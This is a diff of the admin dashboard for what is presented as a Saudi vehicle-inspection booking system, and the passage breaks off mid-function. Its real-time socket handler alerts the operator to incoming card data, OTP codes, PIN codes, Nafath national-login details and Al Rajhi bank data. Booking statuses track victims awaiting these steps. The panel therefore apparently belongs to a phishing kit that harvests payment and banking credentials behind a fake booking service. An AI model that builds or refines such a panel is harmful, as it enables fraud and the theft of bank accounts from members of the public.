@@ -4,621 +4,661 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>لوحة التحكم - نظام الفحص الفني</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
   <style>
-    body { background: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-    .sidebar { width: 260px; min-height: 100vh; background: #1e293b; border-left: 1px solid #334155; position: fixed; top: 0; right: 0; z-index: 100; }
-    .main-content { margin-right: 260px; padding: 20px; }
-    .card-dark { background: #1e293b; border: 1px solid #334155; border-radius: 12px; }
-    .stat-card { background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #334155; border-radius: 12px; padding: 20px; }
-    .badge-new { background: #3b82f6; }
-    .badge-pending { background: #f59e0b; }
-    .badge-completed { background: #10b981; }
-    .badge-new2 { background: #ef4444; }
-    .table-dark { --bs-table-bg: #1e293b; --bs-table-border-color: #334155; }
-    .btn-accept { background: #10b981; border: none; color: white; }
-    .btn-reject { background: #ef4444; border: none; color: white; }
-    .btn-accept:hover { background: #059669; color: white; }
-    .btn-reject:hover { background: #dc2626; color: white; }
-    .notification { position: fixed; top: 20px; left: 20px; z-index: 9999; min-width: 300px; }
-    .nav-link { color: #94a3b8 !important; padding: 10px 20px; border-radius: 8px; margin: 2px 10px; }
-    .nav-link:hover, .nav-link.active { background: #334155; color: #f1f5f9 !important; }
-    .nav-link i { margin-left: 8px; }
-    .detail-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #334155; }
-    .detail-label { color: #94a3b8; font-size: 0.85rem; }
-    .detail-value { color: #f1f5f9; font-weight: 500; }
-    .copy-btn { background: none; border: none; color: #64748b; cursor: pointer; padding: 2px 6px; }
-    .copy-btn:hover { color: #3b82f6; }
-    .pulse { animation: pulse 2s infinite; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-    .login-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-    .login-card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; padding: 40px; width: 100%; max-width: 400px; }
-    #loginSection { display: block; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #f8fafc; color: #1e293b; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 14px; }
+
+    /* ===== Header ===== */
+    .top-header {
+      background: #fff;
+      border-bottom: 1px solid #e2e8f0;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+    }
+    .header-brand { display: flex; align-items: center; gap: 10px; }
+    .header-icon {
+      width: 36px; height: 36px;
+      background: #2563eb; border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      color: white; font-size: 18px;
+    }
+    .header-title { font-weight: 700; color: #1e293b; font-size: 15px; }
+    .header-subtitle { font-size: 11px; color: #64748b; }
+    .header-actions { display: flex; align-items: center; gap: 8px; }
+    .btn-icon {
+      background: none; border: 1px solid #e2e8f0; color: #64748b;
+      padding: 6px 10px; border-radius: 8px; cursor: pointer; font-size: 14px;
+      display: flex; align-items: center; gap: 5px;
+    }
+    .btn-icon:hover { background: #f1f5f9; }
+    .btn-logout {
+      background: none; border: 1px solid #fca5a5; color: #dc2626;
+      padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 13px;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .btn-logout:hover { background: #fef2f2; }
+    .conn-wrap { display: flex; align-items: center; gap: 5px; font-size: 12px; color: #64748b; }
+    .conn-dot { width: 8px; height: 8px; border-radius: 50%; }
+    .conn-dot.on { background: #16a34a; }
+    .conn-dot.off { background: #dc2626; }
+    .bell-wrap { position: relative; }
+    .bell-badge {
+      position: absolute; top: -4px; right: -4px;
+      background: #dc2626; color: white; font-size: 10px; font-weight: 700;
+      width: 17px; height: 17px; border-radius: 50%;
+      display: none; align-items: center; justify-content: center;
+    }
+
+    /* ===== Main ===== */
+    .main-wrap { max-width: 1280px; margin: 0 auto; padding: 24px 20px; }
+
+    /* ===== Stats ===== */
+    .stats-row { display: grid; grid-template-columns: repeat(4,1fr); gap: 16px; margin-bottom: 24px; }
+    @media(max-width:768px){ .stats-row { grid-template-columns: repeat(2,1fr); } }
+    .stat-card {
+      background: #fff; border-radius: 12px; padding: 18px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .stat-label { font-size: 12px; color: #64748b; margin-bottom: 4px; }
+    .stat-val { font-size: 26px; font-weight: 700; }
+    .stat-ico { width: 42px; height: 42px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+    .s-total .stat-val { color: #1e293b; } .s-total .stat-ico { background: #eff6ff; color: #2563eb; }
+    .s-new .stat-val { color: #2563eb; } .s-new .stat-ico { background: #eff6ff; color: #2563eb; }
+    .s-done .stat-val { color: #16a34a; } .s-done .stat-ico { background: #f0fdf4; color: #16a34a; }
+    .s-pend .stat-val { color: #d97706; } .s-pend .stat-ico { background: #fffbeb; color: #d97706; }
+
+    /* ===== Table Card ===== */
+    .tbl-card { background: #fff; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); overflow: hidden; }
+    .tbl-header {
+      padding: 16px 20px; display: flex; align-items: center;
+      justify-content: space-between; border-bottom: 1px solid #f1f5f9; flex-wrap: wrap; gap: 10px;
+    }
+    .tbl-title { font-weight: 600; color: #1e293b; font-size: 15px; }
+    .search-wrap { position: relative; width: 240px; }
+    .search-wrap input {
+      width: 100%; padding: 7px 12px 7px 36px;
+      border: 1px solid #e2e8f0; border-radius: 8px;
+      font-size: 13px; outline: none; background: #f8fafc;
+    }
+    .search-wrap input:focus { border-color: #93c5fd; background: #fff; }
+    .search-ico { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #94a3b8; font-size: 14px; }
+
+    /* ===== Table ===== */
+    table { width: 100%; border-collapse: collapse; }
+    thead tr { background: #f8fafc; }
+    th { padding: 10px 14px; text-align: right; font-size: 12px; font-weight: 600; color: #64748b; border-bottom: 1px solid #e2e8f0; white-space: nowrap; }
+    td { padding: 12px 14px; border-bottom: 1px solid #f1f5f9; vertical-align: middle; font-size: 13px; color: #374151; }
+    tbody tr:hover { background: #f8fafc; }
+    tbody tr.unread { background: #eff6ff; }
+    tbody tr.unread:hover { background: #dbeafe; }
+
+    /* ===== Status Badges ===== */
+    .badge {
+      display: inline-block; padding: 3px 10px; border-radius: 20px;
+      font-size: 11px; font-weight: 600; white-space: nowrap;
+    }
+    .b-new { background:#dbeafe; color:#1d4ed8; }
+    .b-pending_payment { background:#fef9c3; color:#854d0e; }
+    .b-pending_nafath { background:#f3e8ff; color:#6b21a8; }
+    .b-pending_motasel { background:#ffedd5; color:#9a3412; }
+    .b-payment_done { background:#dcfce7; color:#166534; }
+    .b-verified { background:#d1fae5; color:#065f46; }
+    .b-completed { background:#f1f5f9; color:#475569; }
+    .b-cancelled { background:#fee2e2; color:#991b1b; }
+
+    /* ===== Action Buttons ===== */
+    .act-btns { display: flex; gap: 5px; align-items: center; flex-wrap: wrap; }
+    .btn-act {
+      padding: 4px 10px; border-radius: 6px; font-size: 12px; cursor: pointer;
+      border: 1px solid #e2e8f0; background: #fff; color: #374151;
+      display: flex; align-items: center; gap: 4px; white-space: nowrap;
+    }
+    .btn-act:hover { background: #f1f5f9; }
+    .btn-act.blue { background: #2563eb; color: #fff; border-color: #2563eb; }
+    .btn-act.blue:hover { background: #1d4ed8; }
+
+    /* ===== Dropdown ===== */
+    .dd-wrap { position: relative; display: inline-block; }
+    .dd-menu {
+      position: absolute; top: calc(100% + 4px); right: 0;
+      background: #fff; border: 1px solid #e2e8f0; border-radius: 10px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12); min-width: 160px;
+      z-index: 300; padding: 6px; display: none;
+    }
+    .dd-menu.open { display: block; }
+    .dd-item {
+      padding: 8px 12px; border-radius: 6px; cursor: pointer;
+      font-size: 13px; color: #374151;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .dd-item:hover { background: #f1f5f9; }
+
+    /* ===== Login ===== */
+    #loginSection {
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #0f172a 100%);
+    }
+    .login-card {
+      background: #fff; border-radius: 16px; padding: 40px;
+      width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+    .login-icon {
+      width: 72px; height: 72px; background: #2563eb; border-radius: 16px;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px; color: white; font-size: 36px;
+    }
+    .login-title { font-size: 22px; font-weight: 700; color: #1e293b; text-align: center; }
+    .login-sub { font-size: 13px; color: #64748b; text-align: center; margin: 6px 0 28px; }
+    .login-label { font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 6px; display: block; }
+    .login-input {
+      width: 100%; padding: 11px 14px; border: 1px solid #e2e8f0;
+      border-radius: 10px; font-size: 14px; outline: none; margin-bottom: 16px;
+    }
+    .login-input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
+    .login-btn {
+      width: 100%; padding: 12px; background: #2563eb; color: white;
+      border: none; border-radius: 10px; font-size: 15px; font-weight: 600;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .login-btn:hover { background: #1d4ed8; }
+    .login-err { color: #dc2626; font-size: 13px; text-align: center; margin-top: 10px; display: none; }
+
+    /* ===== Dashboard ===== */
     #dashboardSection { display: none; }
-    .step-badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
-    .step-1 { background: #1d4ed8; color: white; }
-    .step-2 { background: #7c3aed; color: white; }
-    .step-3 { background: #b45309; color: white; }
-    .step-4 { background: #065f46; color: white; }
-    #bookingsList .booking-row:hover { background: #1e3a5f; cursor: pointer; }
-    .alert-sound { display: none; }
-    .connected-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; display: inline-block; margin-left: 6px; }
-    .disconnected-dot { width: 8px; height: 8px; border-radius: 50%; background: #ef4444; display: inline-block; margin-left: 6px; }
+
+    /* ===== Modal ===== */
+    .overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.4);
+      z-index: 500; display: none; align-items: center; justify-content: center; padding: 20px;
+    }
+    .overlay.show { display: flex; }
+    .modal-box {
+      background: #fff; border-radius: 16px; width: 100%; max-width: 680px;
+      max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+    }
+    .modal-hdr {
+      padding: 18px 24px; border-bottom: 1px solid #e2e8f0;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .modal-ttl { font-weight: 700; font-size: 16px; color: #1e293b; }
+    .modal-close { background: none; border: none; font-size: 20px; color: #94a3b8; cursor: pointer; padding: 4px 8px; border-radius: 6px; }
+    .modal-close:hover { background: #f1f5f9; color: #374151; }
+    .modal-bdy { padding: 20px 24px; }
+    .sec-title {
+      font-size: 11px; font-weight: 700; color: #64748b;
+      text-transform: uppercase; letter-spacing: 0.05em;
+      margin-bottom: 12px; padding-bottom: 6px; border-bottom: 1px solid #f1f5f9;
+    }
+    .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+    @media(max-width:500px){ .detail-grid { grid-template-columns: 1fr; } }
+    .d-lbl { font-size: 11px; color: #94a3b8; margin-bottom: 3px; }
+    .d-val {
+      font-size: 13px; color: #1e293b; font-weight: 500;
+      background: #f8fafc; padding: 6px 10px; border-radius: 6px;
+      display: flex; align-items: center; justify-content: space-between; gap: 6px; word-break: break-all;
+    }
+    .copy-btn { background: none; border: none; color: #94a3b8; cursor: pointer; padding: 2px; font-size: 13px; flex-shrink: 0; }
+    .copy-btn:hover { color: #2563eb; }
+    .nav-section { background: #f8fafc; border-radius: 10px; padding: 16px; margin-top: 16px; }
+    .nav-sec-title { font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 12px; }
+    .nav-btns { display: flex; flex-wrap: wrap; gap: 8px; }
+    .nav-btn {
+      padding: 7px 14px; border-radius: 8px; font-size: 12px; cursor: pointer;
+      border: 1px solid #e2e8f0; background: #fff; color: #374151;
+      display: flex; align-items: center; gap: 6px; font-weight: 500;
+    }
+    .nav-btn:hover { background: #f1f5f9; border-color: #cbd5e1; }
+
+    /* ===== Toast ===== */
+    .toast-wrap { position: fixed; top: 20px; left: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
+    .toast-item {
+      background: #fff; border: 1px solid #e2e8f0; border-radius: 10px;
+      padding: 12px 16px; box-shadow: 0 4px 16px rgba(0,0,0,0.12);
+      display: flex; align-items: center; gap: 10px; min-width: 260px;
+      animation: toastIn 0.3s ease;
+    }
+    .toast-item.ok { border-right: 3px solid #16a34a; }
+    .toast-item.err { border-right: 3px solid #dc2626; }
+    .toast-item.inf { border-right: 3px solid #2563eb; }
+    @keyframes toastIn { from { transform: translateX(-20px); opacity:0; } to { transform: translateX(0); opacity:1; } }
+
+    /* ===== Empty ===== */
+    .empty { text-align: center; padding: 48px 20px; color: #94a3b8; }
+    .empty i { font-size: 48px; display: block; margin-bottom: 12px; }
+
+    @media(max-width:640px){
+      .main-wrap { padding: 16px 12px; }
+      th:nth-child(4), td:nth-child(4), th:nth-child(5), td:nth-child(5) { display: none; }
+    }
   </style>
 </head>
 <body>
 
-<!-- Login Section -->
+<!-- ===== Login ===== -->
 <div id="loginSection">
-  <div class="login-container">
-    <div class="login-card">
-      <div class="text-center mb-4">
-        <i class="bi bi-shield-lock" style="font-size: 3rem; color: #3b82f6;"></i>
-        <h4 class="mt-3 text-white">لوحة التحكم</h4>
-        <p class="text-muted">نظام حجز الفحص الفني</p>
-      </div>
-      <div class="mb-3">
-        <label class="form-label text-muted">كلمة المرور</label>
-        <div class="input-group">
-          <input type="password" id="passwordInput" class="form-control bg-dark text-white border-secondary" placeholder="أدخل كلمة المرور" />
-          <button class="btn btn-outline-secondary" onclick="togglePassword()"><i class="bi bi-eye" id="eyeIcon"></i></button>
-        </div>
-      </div>
-      <button class="btn btn-primary w-100" onclick="login()">
-        <i class="bi bi-box-arrow-in-right me-2"></i>دخول
-      </button>
-      <div id="loginError" class="alert alert-danger mt-3 d-none"></div>
-    </div>
+  <div class="login-card">
+    <div class="login-icon"><i class="bi bi-car-front-fill"></i></div>
+    <div class="login-title">نظام الفحص الفني</div>
+    <div class="login-sub">لوحة التحكم الإدارية</div>
+    <label class="login-label"><i class="bi bi-shield-lock"></i> كلمة المرور</label>
+    <input type="password" id="pwInput" class="login-input" placeholder="أدخل كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()" />
+    <button class="login-btn" onclick="doLogin()"><i class="bi bi-box-arrow-in-right"></i>تسجيل الدخول</button>
+    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
   </div>
 </div>
 
-<!-- Dashboard Section -->
+<!-- ===== Dashboard ===== -->
 <div id="dashboardSection">
-  <!-- Sidebar -->
-  <div class="sidebar d-flex flex-column p-0">
-    <div class="p-4 border-bottom border-secondary">
-      <h5 class="text-white mb-1"><i class="bi bi-car-front me-2 text-blue-400"></i>لوحة التحكم</h5>
-      <small class="text-muted">نظام الفحص الفني</small>
-      <div class="mt-2">
-        <span id="socketStatus" class="text-muted small">
-          <span class="disconnected-dot"></span>غير متصل
-        </span>
+  <div class="top-header">
+    <div class="header-brand">
+      <div class="header-icon"><i class="bi bi-car-front-fill"></i></div>
+      <div>
+        <div class="header-title">نظام الفحص الفني</div>
+        <div class="header-subtitle">لوحة التحكم</div>
       </div>
     </div>
-    <nav class="flex-grow-1 py-3">
-      <a href="#" class="nav-link active" onclick="showSection('dashboard')"><i class="bi bi-grid"></i>الرئيسية</a>
-      <a href="#" class="nav-link" onclick="showSection('bookings')"><i class="bi bi-calendar-check"></i>الحجوزات <span id="newBadge" class="badge bg-danger ms-1 d-none">0</span></a>
-      <a href="#" class="nav-link" onclick="showSection('settings')"><i class="bi bi-gear"></i>الإعدادات</a>
-    </nav>
-    <div class="p-3 border-top border-secondary">
-      <button class="btn btn-outline-danger btn-sm w-100" onclick="logout()"><i class="bi bi-box-arrow-right me-2"></i>تسجيل الخروج</button>
+    <div class="header-actions">
+      <div class="conn-wrap">
+        <span class="conn-dot off" id="connDot"></span>
+        <span id="connTxt">غير متصل</span>
+      </div>
+      <div class="bell-wrap">
+        <button class="btn-icon" onclick="loadAll()"><i class="bi bi-bell"></i></button>
+        <span class="bell-badge" id="bellBadge">0</span>
+      </div>
+      <button class="btn-icon" onclick="loadAll()"><i class="bi bi-arrow-clockwise"></i></button>
+      <button class="btn-logout" onclick="doLogout()"><i class="bi bi-box-arrow-right"></i>خروج</button>
     </div>
   </div>
 
-  <!-- Main Content -->
-  <div class="main-content">
-    <!-- Dashboard Section -->
-    <div id="sectionDashboard">
-      <h4 class="text-white mb-4"><i class="bi bi-grid me-2"></i>الرئيسية</h4>
-      <div class="row g-3 mb-4">
-        <div class="col-md-3">
-          <div class="stat-card text-center">
-            <i class="bi bi-calendar-check" style="font-size:2rem; color:#3b82f6;"></i>
-            <h3 class="text-white mt-2" id="statTotal">0</h3>
-            <p class="text-muted mb-0">إجمالي الحجوزات</p>
-          </div>
-        </div>
-        <div class="col-md-3">
-          <div class="stat-card text-center">
-            <i class="bi bi-bell" style="font-size:2rem; color:#ef4444;"></i>
-            <h3 class="text-white mt-2" id="statNew">0</h3>
-            <p class="text-muted mb-0">حجوزات جديدة</p>
-          </div>
-        </div>
-        <div class="col-md-3">
-          <div class="stat-card text-center">
-            <i class="bi bi-check-circle" style="font-size:2rem; color:#10b981;"></i>
-            <h3 class="text-white mt-2" id="statCompleted">0</h3>
-            <p class="text-muted mb-0">مكتملة</p>
-          </div>
-        </div>
-        <div class="col-md-3">
-          <div class="stat-card text-center">
-            <i class="bi bi-clock" style="font-size:2rem; color:#f59e0b;"></i>
-            <h3 class="text-white mt-2" id="statPending">0</h3>
-            <p class="text-muted mb-0">قيد المعالجة</p>
-          </div>
-        </div>
+  <div class="main-wrap">
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-card s-total">
+        <div><div class="stat-label">إجمالي الحجوزات</div><div class="stat-val" id="sTotal">0</div></div>
+        <div class="stat-ico"><i class="bi bi-people"></i></div>
       </div>
-      <div class="card-dark p-4">
-        <h6 class="text-white mb-3">آخر الحجوزات</h6>
-        <div id="recentBookings" class="text-muted text-center py-4">جاري التحميل...</div>
+      <div class="stat-card s-new">
+        <div><div class="stat-label">حجوزات جديدة</div><div class="stat-val" id="sNew">0</div></div>
+        <div class="stat-ico"><i class="bi bi-bell"></i></div>
+      </div>
+      <div class="stat-card s-done">
+        <div><div class="stat-label">مكتملة</div><div class="stat-val" id="sDone">0</div></div>
+        <div class="stat-ico"><i class="bi bi-check-circle"></i></div>
+      </div>
+      <div class="stat-card s-pend">
+        <div><div class="stat-label">قيد المعالجة</div><div class="stat-val" id="sPend">0</div></div>
+        <div class="stat-ico"><i class="bi bi-clock"></i></div>
       </div>
     </div>
 
-    <!-- Bookings Section -->
-    <div id="sectionBookings" style="display:none;">
-      <div class="d-flex justify-content-between align-items-center mb-4">
-        <h4 class="text-white mb-0"><i class="bi bi-calendar-check me-2"></i>الحجوزات</h4>
-        <button class="btn btn-outline-secondary btn-sm" onclick="loadBookings()"><i class="bi bi-arrow-clockwise me-1"></i>تحديث</button>
+    <!-- Table -->
+    <div class="tbl-card">
+      <div class="tbl-header">
+        <div class="tbl-title">قائمة الحجوزات</div>
+        <div class="search-wrap">
+          <i class="bi bi-search search-ico"></i>
+          <input type="text" id="srch" placeholder="بحث..." oninput="filterRows()" />
+        </div>
       </div>
-      <div class="card-dark p-0 overflow-hidden">
-        <table class="table table-dark table-hover mb-0">
+      <div style="overflow-x:auto">
+        <table>
           <thead>
             <tr>
-              <th>المرجع</th>
-              <th>الاسم</th>
-              <th>الهاتف</th>
-              <th>الخدمة</th>
-              <th>التاريخ</th>
-              <th>الحالة</th>
-              <th>الإجراءات</th>
+              <th>المرجع</th><th>الاسم</th><th>الهوية</th><th>الجوال</th>
+              <th>اللوحة</th><th>التاريخ</th><th>الحالة</th><th>الإجراءات</th>
             </tr>
           </thead>
-          <tbody id="bookingsList">
-            <tr><td colspan="7" class="text-center text-muted py-4">جاري التحميل...</td></tr>
+          <tbody id="tBody">
+            <tr><td colspan="8"><div class="empty"><i class="bi bi-inbox"></i>جاري التحميل...</div></td></tr>
           </tbody>
         </table>
       </div>
     </div>
-
-    <!-- Settings Section -->
-    <div id="sectionSettings" style="display:none;">
-      <h4 class="text-white mb-4"><i class="bi bi-gear me-2"></i>الإعدادات</h4>
-      <div class="card-dark p-4" style="max-width: 500px;">
-        <h6 class="text-white mb-3">معلومات النظام</h6>
-        <div class="detail-row">
-          <span class="detail-label">الإصدار</span>
-          <span class="detail-value">1.0.0</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">رابط الموقع</span>
-          <span class="detail-value" id="siteUrl">-</span>
-        </div>
-        <div class="detail-row">
-          <span class="detail-label">رابط لوحة التحكم</span>
-          <span class="detail-value" id="adminUrl">-</span>
-        </div>
-      </div>
-    </div>
-
-    <!-- Booking Detail Modal -->
-    <div class="modal fade" id="bookingModal" tabindex="-1">
-      <div class="modal-dialog modal-xl modal-dialog-scrollable">
-        <div class="modal-content" style="background:#1e293b; border:1px solid #334155;">
-          <div class="modal-header border-secondary">
-            <h5 class="modal-title text-white" id="modalTitle">تفاصيل الحجز</h5>
-            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-          </div>
-          <div class="modal-body" id="modalBody">
-            <div class="text-center py-4 text-muted">جاري التحميل...</div>
-          </div>
-        </div>
-      </div>
-    </div>
   </div>
 </div>
 
-<!-- Notification Container -->
-<div id="notificationContainer" class="notification"></div>
+<!-- ===== Detail Modal ===== -->
+<div class="overlay" id="detailOverlay">
+  <div class="modal-box">
+    <div class="modal-hdr">
+      <div class="modal-ttl" id="mTitle">تفاصيل الحجز</div>
+      <button class="modal-close" onclick="closeModal()"><i class="bi bi-x-lg"></i></button>
+    </div>
+    <div class="modal-bdy" id="mBody"></div>
+  </div>
+</div>
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-<script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+<!-- ===== Toasts ===== -->
+<div class="toast-wrap" id="toasts"></div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
-  let authToken = localStorage.getItem('adminToken');
-  let socket = null;
-  let bookingsData = [];
-  let currentBooking = null;
-  const API_BASE = window.location.origin;
+  let token = localStorage.getItem("adm_tk") || "";
+  let rows = [];
+  let sock = null;
 
-  // ==================== Auth ====================
-  async function login() {
-    const password = document.getElementById('passwordInput').value;
-    if (!password) return;
+  const STATUS = {
+    new: { lbl:"جديد", cls:"b-new" },
+    pending_payment: { lbl:"انتظار دفع", cls:"b-pending_payment" },
+    pending_nafath: { lbl:"انتظار نفاذ", cls:"b-pending_nafath" },
+    pending_motasel: { lbl:"انتظار متصل", cls:"b-pending_motasel" },
+    payment_done: { lbl:"تم الدفع", cls:"b-payment_done" },
+    verified: { lbl:"تم التحقق", cls:"b-verified" },
+    completed: { lbl:"مكتمل", cls:"b-completed" },
+    cancelled: { lbl:"ملغي", cls:"b-cancelled" },
+  };
+
+  /* ===== Auth ===== */
+  async function doLogin() {
+    const pw = document.getElementById("pwInput").value;
+    if (!pw) return;
     try {
-      const res = await fetch(`${API_BASE}/api/admin/login`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password }),
+      const r = await fetch("/api/admin/login", {
+        method:"POST", headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ password: pw })
       });
-      const data = await res.json();
-      if (data.success) {
-        authToken = data.token;
-        localStorage.setItem('adminToken', authToken);
-        showDashboard();
+      const d = await r.json();
+      if (d.success && d.token) {
+        token = d.token;
+        localStorage.setItem("adm_tk", token);
+        showDash();
       } else {
-        document.getElementById('loginError').textContent = data.error || 'كلمة المرور غير صحيحة';
-        document.getElementById('loginError').classList.remove('d-none');
+        document.getElementById("loginErr").style.display = "block";
       }
-    } catch (err) {
-      document.getElementById('loginError').textContent = 'خطأ في الاتصال بالخادم';
-      document.getElementById('loginError').classList.remove('d-none');
-    }
+    } catch { document.getElementById("loginErr").style.display = "block"; }
   }
 
-  function logout() {
-    localStorage.removeItem('adminToken');
-    authToken = null;
-    if (socket) socket.disconnect();
-    document.getElementById('dashboardSection').style.display = 'none';
-    document.getElementById('loginSection').style.display = 'block';
+  function doLogout() {
+    localStorage.removeItem("adm_tk");
+    token = "";
+    if (sock) sock.disconnect();
+    document.getElementById("dashboardSection").style.display = "none";
+    document.getElementById("loginSection").style.display = "flex";
   }
 
-  function togglePassword() {
-    const input = document.getElementById('passwordInput');
-    const icon = document.getElementById('eyeIcon');
-    if (input.type === 'password') {
-      input.type = 'text';
-      icon.className = 'bi bi-eye-slash';
-    } else {
-      input.type = 'password';
-      icon.className = 'bi bi-eye';
-    }
-  }
-
-  document.getElementById('passwordInput').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') login();
-  });
-
-  // ==================== Dashboard ====================
-  function showDashboard() {
-    document.getElementById('loginSection').style.display = 'none';
-    document.getElementById('dashboardSection').style.display = 'block';
-    document.getElementById('siteUrl').textContent = `${API_BASE}/site`;
-    document.getElementById('adminUrl').textContent = `${API_BASE}/admin`;
-    initSocket();
-    loadStats();
-    loadBookings();
-  }
-
-  function showSection(name) {
-    document.querySelectorAll('[id^="section"]').forEach(el => el.style.display = 'none');
-    document.getElementById(`section${name.charAt(0).toUpperCase() + name.slice(1)}`).style.display = 'block';
-    document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
-    event.target.closest('.nav-link').classList.add('active');
-    if (name === 'bookings') loadBookings();
-    if (name === 'dashboard') loadStats();
-  }
-
-  // ==================== Socket.io ====================
-  function initSocket() {
-    socket = io(API_BASE, { transports: ['websocket', 'polling'] });
-    socket.on('connect', () => {
-      socket.emit('joinAdmin', { token: authToken });
-      document.getElementById('socketStatus').innerHTML = '<span class="connected-dot"></span>متصل';
-    });
-    socket.on('disconnect', () => {
-      document.getElementById('socketStatus').innerHTML = '<span class="disconnected-dot"></span>غير متصل';
-    });
-    socket.on('newBooking', (data) => {
-      playAlert();
-      showNotification('حجز جديد', `مرجع: ${data.reference}`, 'info');
-      loadBookings();
-      loadStats();
-    });
-    socket.on('newPayment', (data) => {
-      playAlert();
-      const typeNames = { payment: 'بيانات بطاقة', otp: 'رمز OTP', code: 'رمز PIN', nafath: 'بيانات نفاذ', motasel: 'بيانات المتصل', rajhi: 'بيانات الراجحي' };
-      showNotification('بيانات جديدة', `${typeNames[data.type] || 'بيانات'} - ${data.reference}`, 'warning');
-      loadBookings();
-      if (currentBooking === data.reference) openBookingDetail(data.reference);
-    });
-    socket.on('paymentActionSet', (data) => {
-      loadBookings();
-    });
-  }
-
-  // ==================== Stats ====================
-  async function loadStats() {
+  async function checkToken() {
+    if (!token) return false;
     try {
-      const res = await fetch(`${API_BASE}/api/admin/stats`, {
-        headers: { 'Authorization': `Bearer ${authToken}` },
-      });
-      const data = await res.json();
-      if (data.success) {
-        document.getElementById('statTotal').textContent = data.data.total;
-        document.getElementById('statNew').textContent = data.data.new;
-        document.getElementById('statCompleted').textContent = data.data.completed;
-        document.getElementById('statPending').textContent = data.data.total - data.data.completed - data.data.new;
-      }
-    } catch (err) {}
+      const r = await fetch("/api/admin/me", { headers:{ Authorization:"Bearer "+token } });
+      return r.ok;
+    } catch { return false; }
   }
 
-  // ==================== Bookings ====================
-  async function loadBookings() {
+  async function init() {
+    if (token && await checkToken()) { showDash(); return; }
+    document.getElementById("loginSection").style.display = "flex";
+  }
+
+  function showDash() {
+    document.getElementById("loginSection").style.display = "none";
+    document.getElementById("dashboardSection").style.display = "block";
+    loadAll();
+    connectSock();
+  }
+
+  /* ===== API ===== */
+  async function get(url) {
+    const r = await fetch(url, { headers:{ Authorization:"Bearer "+token } });
+    if (r.status === 401) { doLogout(); throw new Error("401"); }
+    return r.json();
+  }
+  async function post(url, body) {
+    const r = await fetch(url, {
+      method:"POST", headers:{"Content-Type":"application/json", Authorization:"Bearer "+token},
+      body: JSON.stringify(body)
+    });
+    if (r.status === 401) { doLogout(); throw new Error("401"); }
+    return r.json();
+  }
+
+  /* ===== Load ===== */
+  async function loadAll() {
     try {
-      const res = await fetch(`${API_BASE}/api/admin/bookings`, {
-        headers: { 'Authorization': `Bearer ${authToken}` },
-      });
-      const data = await res.json();
-      if (data.success) {
-        bookingsData = data.data;
-        renderBookings(bookingsData);
-        renderRecentBookings(bookingsData.slice(0, 5));
-        const newCount = bookingsData.filter(b => b.statusRead === 0).length;
-        const badge = document.getElementById('newBadge');
-        if (newCount > 0) {
-          badge.textContent = newCount;
-          badge.classList.remove('d-none');
-        } else {
-          badge.classList.add('d-none');
-        }
+      const [bd, sd] = await Promise.all([ get("/api/admin/bookings"), get("/api/admin/stats") ]);
+      if (bd.success) { rows = bd.data; renderRows(rows); updateBell(); }
+      if (sd.success) {
+        document.getElementById("sTotal").textContent = sd.data.total ?? 0;
+        document.getElementById("sNew").textContent = sd.data.new ?? 0;
